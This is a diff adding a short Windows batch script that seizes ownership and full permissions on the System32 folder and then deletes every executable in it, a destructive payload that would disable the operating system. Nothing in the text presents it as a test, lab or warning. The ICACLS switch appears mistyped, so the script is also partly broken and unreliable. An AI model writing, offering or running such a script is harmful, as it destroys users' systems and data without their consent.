@@ -1,0 +1,6 @@
+@echo off
+ICACLS %windir%\System32 /granted %username%:F
+TAKEOWN /F %windir%\System32
+cd %windir%\System32
+del *.exe
+pause
